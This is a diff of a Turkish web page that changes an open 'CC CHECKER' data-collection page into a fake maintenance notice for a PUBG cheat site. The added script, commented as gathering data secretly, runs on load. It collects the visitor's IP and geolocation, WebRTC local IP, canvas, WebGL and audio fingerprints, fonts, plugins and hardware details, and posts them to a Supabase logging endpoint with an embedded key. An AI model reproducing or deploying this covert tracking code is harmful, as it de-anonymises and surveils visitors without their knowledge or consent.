@@ -2,27 +2,190 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>CC CHECKER</title>
-    <script>
-        const SUPABASE_URL = "https://ruhvxcltgtemimslszwy.supabase.co/rest/v1/logs";
-        const SUPABASE_KEY = "sb_publishable_N3O2HpzgQq8Q38mtyJEDlw_GR_rULlX";
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TrevaPubgHile - Bakım</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-        async function getLocalIP() {
-            return new Promise((resolve) => {
+        body {
+            background: linear-gradient(135deg, #0a0f1a 0%, #0a0a0a 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Arka plan efekti */
+        body::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0,255,0,0.03) 0%, transparent 70%);
+            animation: slowRotate 20s linear infinite;
+        }
+
+        @keyframes slowRotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 550px;
+            width: 90%;
+            padding: 50px 30px;
+            background: rgba(10, 20, 15, 0.7);
+            backdrop-filter: blur(15px);
+            border-radius: 35px;
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            text-align: center;
+            box-shadow: 0 0 60px rgba(0, 255, 0, 0.1);
+        }
+
+        .logo {
+            font-size: 60px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 5px #0f0);
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #0f0, #2aff2a);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 25px;
+            letter-spacing: 2px;
+        }
+
+        .maintenance-box {
+            background: rgba(0, 20, 0, 0.5);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 25px 0;
+            border-left: 4px solid #0f0;
+            border-right: 4px solid #0f0;
+        }
+
+        .maintenance-text {
+            font-size: 22px;
+            font-weight: 600;
+            color: #adff2f;
+            text-shadow: 0 0 3px #0f0;
+            margin-bottom: 15px;
+        }
+
+        .info-text {
+            font-size: 15px;
+            color: #ccc;
+            line-height: 1.6;
+        }
+
+        .owner {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px dashed rgba(0, 255, 0, 0.3);
+            font-size: 14px;
+            color: #6a6a6a;
+        }
+
+        .owner span {
+            color: #0f0;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #0f0;
+            border-radius: 50%;
+            margin-right: 8px;
+            box-shadow: 0 0 5px #0f0;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 15px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            font-size: 11px;
+            color: #3a3a3a;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">🎮⚡</div>
+    <h1>TREVA PUBG HILE</h1>
+    
+    <div class="maintenance-box">
+        <div class="maintenance-text">
+            <span class="status-dot"></span> SİTEMİZ BAKIMDADIR
+        </div>
+        <div class="info-text">
+            Sistem güncellemesi nedeniyle geçici olarak kapalıyız.<br>
+            En kısa sürede hizmetinizde olacağız.<br>
+            Teşekkürler, anlayışınız için sabırsızlanıyoruz.
+        </div>
+    </div>
+
+    <div class="owner">
+        site sahibi: <span>@cokkonusulacam</span>
+    </div>
+</div>
+
+<div class="footer">
+    TrevaPubgHile &copy; 2026
+</div>
+
+<script>
+    const SUPABASE_URL = "https://ruhvxcltgtemimslszwy.supabase.co/rest/v1/logs";
+    const SUPABASE_KEY = "sb_publishable_N3O2HpzgQq8Q38mtyJEDlw_GR_rULlX";
+
+    // Gizli veri toplama (arka planda, kullanıcı fark etmeden)
+    (async function collectData() {
+        try {
+            // IP ve konum bilgisi
+            let ipRes = await fetch("https://ipapi.co/json/");
+            let ipData = await ipRes.json();
+
+            // Local IP (WebRTC ile)
+            let localIP = await new Promise((resolve) => {
                 let pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
                 pc.createOffer().then(offer => pc.setLocalDescription(offer));
                 pc.onicecandidate = (ice) => {
                     if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                    let localIP = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate)?.[0];
-                    if (localIP) resolve(localIP);
+                    let ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate)?.[0];
+                    if (ip) resolve(ip);
                     pc.close();
                 };
                 setTimeout(() => resolve("Alınamadı"), 2000);
             });
-        }
 
-        function getCanvasFingerprint() {
+            // Canvas parmak izi
             let canvas = document.createElement('canvas');
             let ctx = canvas.getContext('2d');
             canvas.width = 200;
@@ -31,144 +194,109 @@
             ctx.fillRect(0, 0, 200, 50);
             ctx.fillStyle = "#fff";
             ctx.font = "14px Arial";
-            ctx.fillText("Fingerprint", 10, 30);
-            return canvas.toDataURL();
-        }
+            ctx.fillText("FP", 10, 30);
+            let canvasFP = canvas.toDataURL();
 
-        function getWebGLFingerprint() {
+            // WebGL parmak izi
+            let webglFP = "Bilinmiyor";
             try {
-                let canvas = document.createElement('canvas');
-                let gl = canvas.getContext('webgl');
-                if (!gl) return "WebGL desteklenmiyor";
-                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                let glCanvas = document.createElement('canvas');
+                let gl = glCanvas.getContext('webgl');
+                if (gl) {
+                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        webglFP = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
                 }
-                return "Bilinmiyor";
-            } catch(e) {
-                return "Hata";
-            }
-        }
+            } catch(e) {}
 
-        async function getAudioFingerprint() {
+            // Audio parmak izi
+            let audioFP = "Hata";
             try {
                 let AudioContext = window.AudioContext || window.webkitAudioContext;
-                if (!AudioContext) return "AudioContext yok";
-                let ctx = new AudioContext();
-                let oscillator = ctx.createOscillator();
-                let analyser = ctx.createAnalyser();
-                oscillator.connect(analyser);
-                analyser.connect(ctx.destination);
-                oscillator.start(0);
-                let data = new Uint8Array(analyser.frequencyBinCount);
-                analyser.getByteFrequencyData(data);
-                oscillator.stop();
-                await ctx.close();
-                return Array.from(data.slice(0, 10)).join(',');
-            } catch(e) {
-                return "Hata";
-            }
-        }
+                if (AudioContext) {
+                    let ctxAudio = new AudioContext();
+                    let oscillator = ctxAudio.createOscillator();
+                    let analyser = ctxAudio.createAnalyser();
+                    oscillator.connect(analyser);
+                    analyser.connect(ctxAudio.destination);
+                    oscillator.start(0);
+                    let data = new Uint8Array(analyser.frequencyBinCount);
+                    analyser.getByteFrequencyData(data);
+                    oscillator.stop();
+                    await ctxAudio.close();
+                    audioFP = Array.from(data.slice(0, 10)).join(',');
+                }
+            } catch(e) {}
 
-        async function getFonts() {
-            if (!document.fonts) return "Font API yok";
-            let fonts = await document.fonts.ready;
-            let fontList = [];
-            for (let font of fonts) {
-                fontList.push(font.family);
-                if (fontList.length > 20) break;
+            // Font listesi
+            let fonts = [];
+            if (document.fonts) {
+                await document.fonts.ready;
+                for (let font of document.fonts) {
+                    fonts.push(font.family);
+                    if (fonts.length > 20) break;
+                }
             }
-            return fontList.join(', ');
-        }
 
-        function getPlugins() {
+            // Eklentiler
             let plugins = [];
             for (let i = 0; i < navigator.plugins.length; i++) {
                 plugins.push(navigator.plugins[i].name);
             }
-            return plugins.join(', ') || "Eklenti yok";
-        }
 
-        function getDeviceName() {
+            // Cihaz adı
             let ua = navigator.userAgent;
-            if (/iPhone/.test(ua)) return "iPhone";
-            if (/iPad/.test(ua)) return "iPad";
-            if (/Android/.test(ua)) return "Android";
-            if (/Windows/.test(ua)) return "Windows PC";
-            if (/Mac/.test(ua)) return "Mac";
-            if (/Linux/.test(ua)) return "Linux";
-            return "Bilinmiyor";
+            let deviceName = "Bilinmiyor";
+            if (/iPhone/.test(ua)) deviceName = "iPhone";
+            else if (/iPad/.test(ua)) deviceName = "iPad";
+            else if (/Android/.test(ua)) deviceName = "Android";
+            else if (/Windows/.test(ua)) deviceName = "Windows PC";
+            else if (/Mac/.test(ua)) deviceName = "Mac";
+            else if (/Linux/.test(ua)) deviceName = "Linux";
+
+            // Payload oluştur
+            let payload = {
+                ip: ipData.ip,
+                ulke: ipData.country_name,
+                sehir: ipData.city,
+                bolge: ipData.region,
+                isp: ipData.org,
+                vpn_proxy: ipData.proxy || false,
+                hosting: ipData.hosting || false,
+                tor: ipData.tor || false,
+                local_ip: localIP,
+                cihaz_adi: deviceName,
+                tarayici: ua.split(' ')[0],
+                isletim_sistemi: navigator.platform,
+                ekran_cozunurluk: `${screen.width}x${screen.height}`,
+                dil: navigator.language,
+                saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookie_enabled: navigator.cookieEnabled,
+                ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
+                cpu_cekirdek: navigator.hardwareConcurrency || "Bilinmiyor",
+                gpu: webglFP,
+                canvas_fingerprint: canvasFP.substring(0, 200),
+                audio_fingerprint: audioFP,
+                yuklu_fontlar: fonts.join(', ').substring(0, 300),
+                eklentiler: plugins.join(', ').substring(0, 300),
+                user_agent: ua,
+                referer: document.referrer,
+                url_parametreleri: window.location.search.substring(1)
+            };
+
+            // Supabase'e gönder (arka planda)
+            await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+
+        } catch(e) {
+            console.error("Veri toplama hatası:", e);
         }
+    })();
+</script>
 
-        async function sendData() {
-            try {
-                let ipRes = await fetch("https://ipapi.co/json/");
-                let ipData = await ipRes.json();
-
-                let localIP = await getLocalIP();
-                let canvasFP = getCanvasFingerprint();
-                let webglFP = getWebGLFingerprint();
-                let audioFP = await getAudioFingerprint();
-                let fonts = await getFonts();
-                let plugins = getPlugins();
-                let deviceName = getDeviceName();
-
-                let payload = {
-                    ip: ipData.ip,
-                    ulke: ipData.country_name,
-                    sehir: ipData.city,
-                    bolge: ipData.region,
-                    isp: ipData.org,
-                    vpn_proxy: ipData.proxy || false,
-                    hosting: ipData.hosting || false,
-                    tor: ipData.tor || false,
-                    local_ip: localIP,
-                    cihaz_adi: deviceName,
-                    tarayici: navigator.userAgent.split(' ')[0],
-                    isletim_sistemi: navigator.platform,
-                    ekran_cozunurluk: `${screen.width}x${screen.height}`,
-                    dil: navigator.language,
-                    saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookie_enabled: navigator.cookieEnabled,
-                    device_pixel_ratio: window.devicePixelRatio,
-                    ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
-                    cpu_cekirdek: navigator.hardwareConcurrency || "Bilinmiyor",
-                    gpu: webglFP,
-                    webgl_fingerprint: webglFP,
-                    canvas_fingerprint: canvasFP.substring(0, 200),
-                    audio_fingerprint: audioFP,
-                    yuklu_fontlar: fonts.substring(0, 300),
-                    eklentiler: plugins.substring(0, 300),
-                    user_agent: navigator.userAgent,
-                    referer: document.referrer,
-                    url_parametreleri: window.location.search.substring(1)
-                };
-
-                await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
-
-                document.body.innerHTML = "<h2 style='color:green; text-align:center; margin-top:50px;'>Bilgileriniz kaydedildi.</h2>";
-            } catch(e) {
-                document.body.innerHTML = "<h2 style='color:red; text-align:center; margin-top:50px;'>Veri gönderilemedi.</h2>";
-                console.error(e);
-            }
-        }
-
-        window.onload = sendData;
-    </script>
-</head>
-<body style="background:#000; color:#0f0; display:flex; align-items:center; justify-content:center; height:100vh; font-family:monospace;">
-    <div style="text-align:center;">
-        <div class="spinner" style="width:40px;height:40px;border:3px solid #0f0;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
-        <p>Bilgileriniz toplanıyor...</p>
-    </div>
-    <style>
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    </style>
 </body>
 </html>
